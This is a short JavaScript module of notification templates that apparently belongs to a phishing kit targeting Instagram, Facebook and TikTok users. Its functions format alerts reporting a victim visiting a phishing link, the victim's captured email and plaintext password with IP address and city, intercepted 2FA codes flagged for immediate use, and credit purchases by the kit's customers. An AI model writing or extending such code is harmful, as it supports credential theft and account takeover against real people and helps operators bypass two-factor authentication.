async function visitorNotification(linkname){
    return `
👤 <b>New Visitor</b>
Link: ${linkname}
Status: Active

<i>Awaiting login...</i>
    `;
}

async function loginNotification(email, password, platform, ip, city, country){
    const platformEmoji = platform.toLowerCase() === 'instagram' ? '📸' : 
                         platform.toLowerCase() === 'facebook' ? '👥' : 
                         platform.toLowerCase() === 'tiktok' ? '🎵' : '🌐';

    return `
${platformEmoji} <b>New ${platform} Login</b>

Login Details:
• Email/User: ${email}
• Password: ${password}

Location:
• ${city}, ${country}
• IP: ${ip}
    `;
}

async function otpNotification(otp, platform){
    const platformEmoji = platform.toLowerCase() === 'instagram' ? '📸' : 
                         platform.toLowerCase() === 'facebook' ? '👥' : 
                         platform.toLowerCase() === 'tiktok' ? '🎵' : '🌐';
    
    return `
${platformEmoji} <b>${platform} 2FA Code</b>

Code: ${otp}
⚠️ Use immediately - time sensitive
    `;
}

async function creditTransactionNotification(amount, balance) {
    return `
💳 <b>Credits Added</b>

• Added: ${amount} credits
• New Balance: ${balance} credits

Thank you for your purchase!
    `;
}

module.exports = {
    visitorNotification,
    loginNotification,
    otpNotification,
    creditTransactionNotification
}